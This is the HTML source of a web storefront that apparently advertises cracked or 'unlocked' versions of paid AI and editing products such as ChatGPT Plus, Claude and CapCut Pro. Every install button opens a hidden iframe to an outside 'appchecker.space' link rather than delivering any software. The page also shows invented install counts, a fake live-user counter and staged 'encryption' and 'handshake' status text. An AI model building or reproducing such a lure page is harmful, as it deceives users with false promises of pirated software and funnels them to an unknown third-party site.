<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OGAM STORE | Future of Intelligence</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Outfit:wght@300;400;600;900&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg: #030305;
            --neon-blue: #00f3ff;
            --neon-purple: #bc13fe;
            --glass: rgba(15, 15, 20, 0.7);
        }

        body {
            background-color: var(--bg);
            color: #ffffff;
            font-family: 'Outfit', sans-serif;
            overflow-x: hidden;
        }

        /* Cyberpunk Grid Background */
        .cyber-grid {
            position: fixed;
            inset: 0;
            background-image: 
                linear-gradient(to right, rgba(0, 243, 255, 0.03) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            mask-image: radial-gradient(circle at 50% 50%, black, transparent);
            z-index: -1;
        }

        .neon-glow {
            position: fixed;
            width: 400px; height: 400px;
            background: radial-gradient(circle, rgba(188, 19, 254, 0.15) 0%, rgba(0,0,0,0) 70%);
            filter: blur(80px);
            z-index: -1;
            pointer-events: none;
        }

        /* Glassmorphism Logic */
        .glass-panel {
            background: var(--glass);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }

        .neon-card {
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
        }

        .neon-card:hover {
            transform: scale(1.03) translateY(-5px);
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
        }

        /* CTA Animations */
        .btn-cta {
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .btn-cta:active {
            transform: scale(0.95);
            filter: brightness(1.2);
        }

        .btn-cta::after {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
            transform: rotate(45deg);
            transition: 0.5s;
        }

        .btn-cta:hover::after {
            left: 100%;
        }

        .syncopate { font-family: 'Syncopate', sans-serif; }
        .mono { font-family: 'JetBrains Mono', monospace; }

        #detail-overlay {
            position: fixed; inset: 0;
            background: rgba(3, 3, 5, 0.98);
            z-index: 1000; display: none;
            backdrop-filter: blur(25px);
        }
    </style>
</head>
<body class="antialiased">

    <div class="cyber-grid"></div>
    <div class="neon-glow" style="top: 10%; right: 10%;"></div>
    <div class="neon-glow" style="bottom: 10%; left: 10%; background: radial-gradient(circle, rgba(0, 243, 255, 0.15) 0%, rgba(0,0,0,0) 70%);"></div>

    <nav class="fixed top-0 w-full z-[100] px-6 py-5 glass-panel border-b border-white/5">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-gradient-to-br from-cyan-400 to-purple-600 rounded-lg flex items-center justify-center shadow-[0_0_15px_rgba(0,243,255,0.5)]">
                    <span class="syncopate text-xs text-black">O</span>
                </div>
                <span class="syncopate text-xl tracking-tighter">OGAM</span>
            </div>
            <div class="flex items-center gap-4">
                <div class="hidden sm:block mono text-[10px] text-cyan-400 bg-cyan-400/10 px-3 py-1 rounded-full border border-cyan-400/30">
                    NETWORK: SECURE_V3
                </div>
                <button onclick="scrollToApps()" class="btn-cta px-5 py-2 rounded-full text-[10px] font-black tracking-widest uppercase">Explore</button>
            </div>
        </div>
    </nav>

    <main class="pt-40 pb-20 px-6">
        <div class="max-w-7xl mx-auto">
            <header class="text-center mb-32">
                <div class="inline-block px-4 py-1 rounded-full border border-purple-500/30 bg-purple-500/10 text-purple-400 text-[10px] font-black tracking-[0.3em] uppercase mb-8">
                    2026 Intelligence Protocol
                </div>
                <h1 class="text-6xl md:text-9xl font-black syncopate leading-tight mb-8">
                    EVOLVE <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-500">FASTER.</span>
                </h1>
                <p class="text-xl md:text-2xl text-gray-400 font-light max-w-2xl mx-auto leading-relaxed mb-12">
                    Access the most powerful AI and Video Editing builds ever created. Zero limits. Maximum output.
                </p>
                <div class="flex flex-col sm:flex-row justify-center gap-6">
                    <button onclick="scrollToApps()" class="btn-cta px-12 py-5 rounded-2xl text-sm font-black tracking-widest uppercase shadow-[0_0_30px_rgba(0,243,255,0.3)]">Get Started</button>
                    <div class="flex items-center gap-3 justify-center mono text-xs text-gray-500">
                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                        14.2k Active Users
                    </div>
                </div>
            </header>

            <section id="featured-section">
                <div class="flex items-center gap-4 mb-16">
                    <h2 class="syncopate text-2xl tracking-tighter">FEATURED_BUILDS</h2>
                    <div class="flex-grow h-[1px] bg-gradient-to-r from-white/10 to-transparent"></div>
                </div>
                
                <div id="app-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8"></div>
            </section>
        </div>
    </main>

    <div id="detail-overlay">
        <div class="max-w-6xl mx-auto px-6 py-20">
            <button onclick="closeOverlay()" class="mb-16 flex items-center gap-3 text-gray-500 hover:text-cyan-400 font-bold transition-all text-xs tracking-widest uppercase">
                <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
                Abort Connection
            </button>
            <div id="overlay-content"></div>
        </div>
    </div>

    <div id="locker-modal" class="fixed inset-0 z-[2000] bg-black/95 hidden items-center justify-center p-4" onclick="this.style.display='none'">
        <div class="w-full max-w-lg h-[80vh] bg-white rounded-[40px] overflow-hidden shadow-2xl" onclick="event.stopPropagation()">
            <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0" class="w-full h-full"></iframe>
        </div>
    </div>

    <script>
        const apps = [
            { name: 'Claude 3.5 Sonnet', tag: 'AI Logic', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/claude-ai-icon.png', desc: 'Anthropic\'s reasoning flagship. Unlocked 200k context build with premium coding artifacts UI.', installs: '24k+' },
            { name: 'DeepSeek R1', tag: 'Reasoning', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/deepseek-logo-icon.png', desc: 'Deep-thinking mathematical engine. The leading 2026 open-source intelligence build.', installs: '18k+' },
            { name: 'ChatGPT Plus', tag: 'Neural Node', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/chatgpt-icon.png', desc: 'Priority access to GPT-4o, DALL-E 3, and advanced voice protocols with web-vision.', installs: '102k+' },
            { name: 'CapCut Pro', tag: 'Editing', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/capcut-icon.png', desc: 'Unlocked high-bitrate 4K raw production suite. All AI VFX and smart templates included.', installs: '85k+' },
            { name: 'Perplexity Pro', tag: 'Search', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png', desc: 'Real-time search with verified citations. Switch between R1, Claude, and GPT-4o instantly.', installs: '31k+' },
            { name: 'Canva Pro', tag: 'Design', icon: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/canva-icon.png', desc: 'Full Magic Studio access. Enterprise-grade branding assets and AI generation tools unlocked.', installs: '55k+' }
        ];

        function init() {
            const grid = document.getElementById('app-grid');
            apps.forEach((app, i) => {
                grid.innerHTML += `
                    <div class="glass-panel neon-card p-10 cursor-pointer flex flex-col justify-between" onclick="openOverlay(${i})">
                        <div>
                            <div class="w-16 h-16 bg-black/50 border border-white/10 rounded-2xl flex items-center justify-center mb-10 shadow-xl shadow-cyan-500/5">
                                <img src="${app.icon}" class="w-10 h-10 object-contain" onerror="this.src='https://ui-avatars.com/api/?name=${app.name}&background=030305&color=00f3ff'">
                            </div>
                            <span class="mono text-[10px] text-purple-500 font-bold tracking-[0.3em] uppercase mb-3 block">${app.tag}</span>
                            <h3 class="syncopate text-2xl mb-4 tracking-tighter">${app.name}</h3>
                        </div>
                        <div class="mt-12 flex justify-between items-center pt-8 border-t border-white/5">
                            <span class="mono text-[10px] text-gray-500">${app.installs} INSTALLS</span>
                            <div class="text-cyan-400 font-bold text-xs uppercase tracking-widest">Install</div>
                        </div>
                    </div>
                `;
            });
        }

        function openOverlay(idx) {
            const app = apps[idx];
            const overlay = document.getElementById('detail-overlay');
            document.getElementById('overlay-content').innerHTML = `
                <div class="grid lg:grid-cols-2 gap-20 items-center">
                    <div>
                        <div class="w-24 h-24 rounded-3xl bg-white/5 border border-cyan-400/20 flex items-center justify-center mb-12 shadow-2xl shadow-cyan-500/10">
                            <img src="${app.icon}" class="w-14 h-14 object-contain">
                        </div>
                        <h2 class="syncopate text-6xl md:text-7xl mb-10 leading-none">${app.name}</h2>
                        <p class="text-2xl text-gray-400 font-light leading-relaxed mb-16">${app.desc}</p>
                        
                        <div class="flex flex-col sm:flex-row gap-6">
                            <button onclick="showLocker()" class="btn-cta px-16 py-7 rounded-3xl text-lg font-black tracking-widest uppercase shadow-[0_0_50px_rgba(188,19,254,0.3)]">Install App</button>
                            <button onclick="showLocker()" class="px-16 py-7 rounded-3xl border border-white/10 hover:bg-white/5 text-lg font-black tracking-widest uppercase transition-all">Provisioning</button>
                        </div>
                    </div>
                    
                    <div class="glass-panel p-12 rounded-[40px] border border-cyan-400/20 shadow-2xl">
                        <div class="mono text-[11px] space-y-8">
                            <div class="flex justify-between items-center border-b border-white/5 pb-6">
                                <span class="text-gray-500 uppercase tracking-widest">Protocol Status</span>
                                <span class="text-green-500 font-bold">READY_TO_PATCH</span>
                            </div>
                            <div class="flex justify-between items-center border-b border-white/5 pb-6">
                                <span class="text-gray-500 uppercase tracking-widest">Encryption</span>
                                <span class="text-cyan-400 font-bold">AES_256_ACTIVE</span>
                            </div>
                            <div class="flex justify-between items-center border-b border-white/5 pb-6">
                                <span class="text-gray-500 uppercase tracking-widest">License Source</span>
                                <span class="text-purple-400 font-bold">OGAM_GLOBAL</span>
                            </div>
                            <p class="text-white font-bold leading-relaxed pt-8 text-sm">INITIALIZING HANDSHAKE BETWEEN DEVICE AND SECURE VAULT. DATA TRANSMISSION READY.</p>
                        </div>
                    </div>
                </div>
            `;
            overlay.style.display = 'block';
            gsap.from("#overlay-content", { opacity: 0, scale: 0.95, duration: 0.5, ease: "back.out" });
        }

        function closeOverlay() { document.getElementById('detail-overlay').style.display = 'none'; }
        function showLocker() { document.getElementById('locker-modal').style.display = 'flex'; }
        function scrollToApps() { document.getElementById('featured-section').scrollIntoView({ behavior: 'smooth' }); }

        init();
    </script>
</body>
</html>
